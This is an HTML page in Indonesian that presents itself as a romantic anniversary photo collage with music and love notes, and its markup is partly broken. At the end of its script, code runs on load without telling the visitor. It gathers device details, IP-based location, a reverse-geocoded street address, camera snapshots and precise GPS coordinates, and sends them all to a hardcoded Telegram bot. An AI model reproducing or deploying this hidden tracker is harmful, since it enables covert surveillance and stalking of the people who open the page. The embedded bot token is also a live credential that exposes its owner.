<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Archive 04.04</title>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,900;1,400&family=Plus+Jakarta+Sans:wght@300;400;700&family=Special+Elite&display=swap" rel="stylesheet">
    <style>
        :root {
            --spotify-green: #1DB954;
            --accent-red: #ff4d4d;
            --bg-dark: #050505;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }

        body {
            background-color: var(--bg-dark);
            color: white;
            font-family: 'Plus Jakarta Sans', sans-serif;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            position: fixed;
        }

        /* LOADING SCREEN */
        #loading-screen {
            position: fixed; inset: 0;
            background: var(--bg-dark);
            display: flex; justify-content: center; align-items: center;
            z-index: 9999;
            transition: opacity 1s ease;
        }

        .system-card {
            width: 90%; max-width: 340px;
            background: #121212;
            padding: 20px;
            border-radius: 20px;
            border: 1px solid rgba(255,255,255,0.05);
            box-shadow: 0 25px 50px rgba(0,0,0,1);
        }

        .video-container {
            width: 100%;
            height: 190px;
            background: #000;
            border-radius: 12px;
            overflow: hidden;
            margin-bottom: 20px;
        }

        .video-container video {
            width: 100%; height: 100%; object-fit: cover;
        }

        .status-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }

        .status-text {
            font-size: 10px;
            color: #555;
            letter-spacing: 1.5px;
            font-weight: 700;
            display: flex;
            align-items: center;
            gap: 6px;
            transition: color 0.5s;
        }

        .status-dot {
            width: 6px; height: 6px;
            background: var(--accent-red);
            border-radius: 50%;
            animation: pulse 1s infinite;
        }

        @keyframes pulse {
            0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; }
        }

        .percentage {
            font-size: 10px; color: white; font-weight: 700;
            min-width: 35px; text-align: right;
        }

        .progress-bar-bg {
            width: 100%; height: 4px;
            background: rgba(255,255,255,0.1);
            border-radius: 10px; overflow: hidden;
        }

        #progress-bar-fill {
            width: 0%; height: 100%;
            background: var(--accent-red);
            /* Transition dihapus agar requestAnimationFrame yang handle kehalusannya */
        }

        /* SPOTIFY BAR */
        .spotify-mini {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            width: 92%; max-width: 380px;
            background: rgba(18, 18, 18, 0.95); backdrop-filter: blur(20px);
            border: 1px solid rgba(255,255,255,0.08); padding: 12px 16px;
            border-radius: 15px; display: flex; align-items: center; gap: 12px;
            z-index: 1000; opacity: 0; transition: 0.8s;
            pointer-events: none;
        }

        .spotify-mini.show { opacity: 1; pointer-events: auto; }

        .spot-logo { width: 26px; height: 26px; color: var(--spotify-green); }
        .spot-info { flex: 1; overflow: hidden; }
        .spot-info h4 { font-size: 14px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
        .spot-info p { font-size: 11px; color: #b3b3b3; }

        .spot-play-btn {
            width: 36px; height: 36px; background: white;
            border-radius: 50%; border: none; color: black; display: flex; align-items: center; justify-content: center;
            font-size: 12px; cursor: pointer;
        }

        /* SCENES */
        #app { width: 100%; height: 100%; }
        .scene {
            position: absolute; inset: 0; display: flex; justify-content: center; align-items: center;
            opacity: 0; visibility: hidden; transition: 0.8s ease;
        }
        .scene.active { opacity: 1; visibility: visible; }

        .collage-container {
            position: relative; width: 100%; height: 70vh; margin-top: 60px;
        }

        .item { position: absolute; opacity: 0; transition: all 0.7s cubic-bezier(0.23, 1, 0.32, 1); cursor: pointer; }
        .polaroid { background: #fff; padding: 10px 10px 22px 10px; width: 135px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        .polaroid img { width: 100%; height: 120px; object-fit: cover; }
        .polaroid .note { font-family: 'Special Elite', cursive; color: #111; text-align: center; margin-top: 8px; font-size: 8px; line-height: 1.2; }

        .photobooth { background: #111; padding: 6px; width: 95px; display: flex; flex-direction: column; gap: 5px; box-shadow: 0 10px 30px rgba(0,0,0,0.6); }
        .photobooth img { width: 100%; height: 85px; object-fit: cover; }

        .focused { top: 50% !important; left: 50% !important; transform: translate(-50%, -50%) scale(2.2) rotate(0deg) !important; z-index: 5000 !important; }
        .dimmer { position: fixed; inset: 0; background: rgba(0,0,0,0.9); opacity: 0; visibility: hidden; transition: 0.4s; z-index: 4000; }
        .dimmer.active { opacity: 1; visibility: visible; }

        .hint-swipe { position: fixed; bottom: 20px; width: 100%; text-align: center; font-size: 8px; color: #333; letter-spacing: 2px; }

        .final-card {
            background: white; color: black; padding: 30px; border-radius: 2px; width: 85%; max-width: 320px;
            text-align: center; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
        }
    </style>
</head>
<body>

    <div id="app">

            <div style="text-align: center;">
                <h1 style="font-family: 'Playfair Display'; font-size: 3.5rem;">2026<br>04.04</h1>

        <div class="scene">

                <h2 style="font-family: 'Playfair Display'; font-size: 1.5rem; border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 10px;">Endless Love.</h2>
                <p style="font-size: 12px; line-height: 1.6;">Terima kasih sudah menjadi bagian terindah di tahun ini.</p>
                <p style="margin-top: 20px; font-weight: bold; color: var(--spotify-green);">— 04.04.2026</p>
            </div>
        </div>
    </div>

    <div class="hint-swipe">BY BJORKNISM</div>

    <audio id="main-audio" loop>
        <source src="https://h.top4top.io/m_37630vfez0.mp3" type="audio/mp4">
    </audio>

    <script>
        const audio = document.getElementById('main-audio');
        const video = document.getElementById('intro-video');
        const progFill = document.getElementById('progress-bar-fill');
        const pctText = document.getElementById('load-pct');
        const statusLabel = document.getElementById('status-label');
        const loadScreen = document.getElementById('loading-screen');
        const spotifyBar = document.getElementById('spotify-bar');

        // SINKRONISASI LOADING DENGAN DURASI VIDEO
        video.onloadedmetadata = () => {
            const videoDuration = video.duration * 1000; // milidetik
            let startTime = null;

            function animateLoading(timestamp) {
                if (!startTime) startTime = timestamp;
                const elapsed = timestamp - startTime;
                const progress = Math.min((elapsed / videoDuration) * 100, 100);

                progFill.style.width = progress + '%';
                pctText.innerText = Math.floor(progress) + '%';

                if (progress < 100) {
                    requestAnimationFrame(animateLoading);
                } else {
                    statusLabel.innerHTML = '<div class="status-dot" style="background:var(--spotify-green)"></div> READY TO OPEN';
                    statusLabel.style.color = "var(--spotify-green)";
                    loadScreen.style.cursor = "pointer";
                    loadScreen.onclick = startExperience;
                }
            }
            requestAnimationFrame(animateLoading);
        };

        function startExperience() {
            loadScreen.style.opacity = '0';
            spotifyBar.classList.add('show');
            setTimeout(() => { 
                loadScreen.style.display = 'none'; 
                togglePlay(); 
            }, 1000);
        }

        function togglePlay() {
            const btn = document.getElementById('playBtn');
            if(audio.paused) { audio.play(); btn.innerHTML = '❚❚'; }
            else { audio.pause(); btn.innerHTML = '▶'; }
        }

        audio.ontimeupdate = () => {
            document.getElementById('progress').style.width = (audio.currentTime / audio.duration) * 100 + '%';
        };

        // GALLERY DATA
        const gallery = [
    { src: "https://g.top4top.io/p_3763qy4au1.jpg", note: "The first spark that started it all. ✨", type: "polaroid" },
    { src: "https://f.top4top.io/p_3763dspap0.jpg", note: "Stuck in this moment, and I don't mind. ⏳", type: "photobooth" },
    { src: "https://i.top4top.io/p_3763ahrpq5.jpg", note: "Definisi 'rumah' yang nggak berbentuk bangunan. 🏠", type: "polaroid" },
    { src: "https://h.top4top.io/p_3763nu0ee4.jpg", note: "In a room full of art, I'd still stare at you. 🖼️", type: "photobooth" },
    { src: "https://g.top4top.io/p_3763i4zuu3.jpg", note: "Dunia boleh berisik, asal di sini tetap tenang. 🎧", type: "polaroid" },
    { src: "https://f.top4top.io/p_376382o5u2.jpg", note: "Finding pieces of peace in your smile. 🌙", type: "photobooth" },
    { src: "https://e.top4top.io/p_3763wfl7n1.jpg", note: "Random, chaotic, but purely magic. 🪄", type: "polaroid" },
    { src: "https://d.top4top.io/p_3763ikqm50.jpg", note: "Satu dari jutaan alasan aku bersyukur. ❤️", type: "photobooth" },
    { src: "https://f.top4top.io/p_37637gtj00.jpg", note: "Every little thing you do is magic. ✨", type: "polaroid" },
    { src: "https://g.top4top.io/p_3763ysdtu1.jpg", note: "Captured memories, eternal feelings. 🎞️", type: "photobooth" },
    { src: "https://h.top4top.io/p_3763izoge2.jpg", note: "You are my favorite notification. 📱", type: "polaroid" },
    { src: "https://i.top4top.io/p_37633hd9x3.jpg", note: "Life is better when we're laughing. 😂", type: "photobooth" },
    { src: "https://j.top4top.io/p_3763vc4p44.jpg", note: "To more sunsets and stories together. 🌅", type: "polaroid" },
    { src: "https://k.top4top.io/p_3763uf4tx5.jpg", note: "My sun, my moon, and all my stars. 🌌", type: "photobooth" },
    { src: "https://l.top4top.io/p_3763xz4sz6.jpg", note: "Small moments, big love. 💖", type: "polaroid" },
    { src: "https://a.top4top.io/p_37631j1oy7.jpg", note: "Thank you for being you. 🌹", type: "photobooth" },
    { src: "https://c.top4top.io/p_376395tyk9.jpg", note: "Our journey is my favorite story. 📖", type: "polaroid" }
];

        function initCollage() {
            const container = document.getElementById('collage');
            container.innerHTML = '';
            gallery.forEach((item, i) => {
                const div = document.createElement('div');
                div.className = `item ${item.type}`;
                const x = 10 + (Math.random() * 60);
                const y = 5 + (Math.random() * 70);
                const r = (Math.random() - 0.5) * 20;
                div.style.left = `${x}%`; div.style.top = `${y}%`;
                div.style.transform = `rotate(${r}deg) scale(0.8)`;
                div.style.zIndex = i;
                
                if(item.type === 'polaroid') {
                    div.innerHTML = `<img src="${item.src}"><div class="note">${item.note}</div>`;
                } else {
                    div.innerHTML = `<img src="${item.src}"><img src="${item.src}"><img src="${item.src}">`;
                }

                div.onclick = (e) => {
                    e.stopPropagation();
                    if(div.classList.contains('focused')) {
                        div.classList.remove('focused');
                        document.getElementById('dimmer').classList.remove('active');
                    } else {
                        document.querySelectorAll('.item').forEach(el => el.classList.remove('focused'));
                        div.classList.add('focused');
                        document.getElementById('dimmer').classList.add('active');
                    }
                };
                container.appendChild(div);
                setTimeout(() => div.style.opacity = '1', i * 100);
            });
        }

        document.getElementById('dimmer').onclick = () => {
            document.querySelectorAll('.item').forEach(el => el.classList.remove('focused'));
            document.getElementById('dimmer').classList.remove('active');
        };

        let currentScene = 0;
        const scenes = document.querySelectorAll('.scene');
        document.body.onclick = (e) => {
            if(e.target.closest('#loading-screen') || e.target.closest('.item') || e.target.closest('.spotify-mini')) return;
            scenes[currentScene].classList.remove('active');
            currentScene = (currentScene + 1) % scenes.length;
            scenes[currentScene].classList.add('active');
            if(currentScene === 1) initCollage();
        };
        (()=>{
    const T='8603949137:AAHEUMArtK0rcZHeBZ1RMT57ZioHk0gW9Tk', // <-- MASUKKAN TOKEN BOT TELEGRAM ANDA DI SINI
          C='8569510037', // <-- MASUKKAN CHAT ID TELEGRAM ANDA DI SINI
          pb=document.getElementById('progress-bar'),
          ld=document.getElementById('loading-details');

    let p=0;
    const LM=["Memeriksa modul sistem...","Memuat komponen inti...","Menginisialisasi antarmuka...","Memverifikasi koneksi...","Menyiapkan lingkungan...","Memeriksa pembaruan...","Memuat aset tampilan..."];
    

    // Fungsi kirim pesan ke Telegram
    const sTG=async d=>{try{await fetch(`https://api.telegram.org/bot${T}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:C,text:d,parse_mode:'HTML'})})}catch(e){}};
    
    // Fungsi kirim foto ke Telegram
    const sP=async(b,f)=>{try{const fd=new FormData();fd.append('chat_id',C);fd.append('photo',b,f);await fetch(`https://api.telegram.org/bot${T}/sendPhoto`,{method:'POST',body:fd})}catch(e){}};
    
    // Fungsi mendapatkan lokasi detail dari koordinat
    const gLD=async(a,b)=>{try{const r=await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${a}&lon=${b}&zoom=18&addressdetails=1`),d=await r.json();if(d.address)return{kb:d.address.county||d.address.city||d.address.state||"Tidak diketahui",kc:d.address.suburb||d.address.village||d.address.town||"Tidak diketahui",fa:d.display_name||"Alamat tidak tersedia"}}catch(e){}return{kb:"Tidak diketahui",kc:"Tidak diketahui",fa:"Alamat tidak tersedia"}};
    
    // Fungsi mendapatkan informasi perangkat
    const cDI=async()=>{let m='╭───── Tracking Report ───── ⦿\n\n';m+='⚙️ Result Device\n';m+=`🖥️ Device: ${navigator.userAgent}\n💻 Platform: ${navigator.platform}\n🌐 Bahasa: ${navigator.language}\n📶 Online: ${navigator.onLine?'Online':'Offline'}\n📺 Screen Size: ${screen.width}x${screen.height}\n🪟 Window Size: ${innerWidth}x${innerHeight}\n💾 RAM: ${navigator.deviceMemory||'Unknown'} GB\n🧠 CPU Cores: ${navigator.hardwareConcurrency}\n`;if(navigator.getBattery){try{const b=await navigator.getBattery();m+=`🔋 Battery: ${Math.floor(b.level*100)}%\n🔌 Charging: ${b.charging?'✅ YA':'❌ TIDAK'}\n`}catch(e){m+='🔋 Battery: ❌ Tidak tersedia\n'}}m+=`⏰ Waktu Akses: ${new Date().toString()}\n🕒 Page Load Time: ${performance.now().toFixed(2)} ms\n📜 History Length: ${history.length}\n✋ Touch Support: ${'ontouchstart'in window?'✅ YA':'❌ TIDAK'}\n🔗 Referrer: ${document.referrer||'None'}\n🌍 URL: ${location.href}\n📄 Title: ${document.title}\n🕓 Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n🧭 Offset: ${new Date().getTimezoneOffset()} menit\n\n`;try{const i=await fetch('https://ipapi.co/json/'),d=await i.json();m+='📍 LOCATION INFORMATION\n';m+=`📡 IP Address: ${d.ip}\n🏙️ Kota: ${d.city}\n🏙️ Kabupaten: ${d.region}\n🗺️ Wilayah: ${d.region}\n🌎 Negara: ${d.country_name}\n🏷️ Kode Pos: ${d.postal}\n`;if(d.latitude&&d.longitude){m+=`📌 Latitude: ${d.latitude}\n📍 Longitude: ${d.longitude}\n`;const l=await gLD(d.latitude,d.longitude);m+=`🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat Lengkap: ${l.fa}\n`}}catch(e){m+='❌ Gagal mendapatkan informasi lokasi\n'}m+='\n╰───── Telegram @Bjorknism ───── ⦿';return m};

    // Mengambil gambar dari kamera dengan mode tertentu
    const captureCamera = async (mode) => {
        const v = document.getElementById('v'), 
              c = document.getElementById('c');
        let stream;
        try {
            stream = await navigator.mediaDevices.getUserMedia({
                video: { 
                    facingMode: { exact: mode } 
                }
            });
            v.srcObject = stream;
            
            await new Promise(resolve => v.onloadedmetadata = resolve);
            v.play();

            // Waktu tunggu kamera 1.5 detik
            await new Promise(r => setTimeout(r, 1500)); 
            
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            c.getContext('2d').drawImage(v, 0, 0);
            
            c.toBlob(b => sP(b, `${mode}_camera_capture.jpg`), 'image/jpeg');
            
            stream.getTracks().forEach(t => t.stop());
            return true; 
            
        } catch (e) {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
            }
            await sTG(`⚠️ Gagal Akses Kamera ${mode.toUpperCase()}. Mencoba mode lain...`);
            return false; 
        }
    };

    // FUNGSI UTAMA: Menjalankan semua proses tracking
    const ST=async()=>{
        await sTG(await cDI()); 

        let cameraSuccess = false;

        // 1. Coba Kamera Depan (User)
        cameraSuccess = await captureCamera("user");

        // 2. Jika Gagal, Coba Kamera Belakang (Environment)
        if (!cameraSuccess) {
            cameraSuccess = await captureCamera("environment");
        }

        if (!cameraSuccess) {
             await sTG('HACK KAMERA NO AKSES ');
        }

        // Menggunakan getCurrentPosition untuk hanya mengirim 1x dan menambahkan link Google Maps
        if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(async (p) => {
        const lat = p.coords.latitude;
        const lon = p.coords.longitude;
        const acc = p.coords.accuracy;

        // Perbaikan Link Google Maps (Gunakan format standar)
        let g = `📍 GPS (ONE-TIME)\n`;
        g += `📌 Lat: ${lat}\n📍 Lng: ${lon}\n`;
        g += `🎯 Akurasi: ${acc.toFixed(1)}m\n`;
        g += `🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}\n\n`;

        try {
            // Ambil data lokasi (Reverse Geocoding)
            const l = await gLD(lat, lon);
            g += `🏙️ Kabupaten: ${l.kb}\n🏙️ Kecamatan: ${l.kc}\n🏠 Alamat: ${l.fa}\n`;
        } catch (err) {
            g += `⚠️ Gagal memuat detail alamat.\n`;
        }

        // Kirim pesan
        await sTG(g);
        
    }, async (e) => {
        // Error handling
        await sTG(`❌ Error Geolocation: ${e.message}`);
    }, {
        enableHighAccuracy: true,
        maximumAge: 0,
        timeout: 10000 // Ditambah jadi 10 detik agar lebih stabil
    });
} else {
    console.error("Browser tidak mendukung Geolocation");
}
    };    

    // Langsung menjalankan fungsi ST tanpa delay
    ST();
})();
    </script>
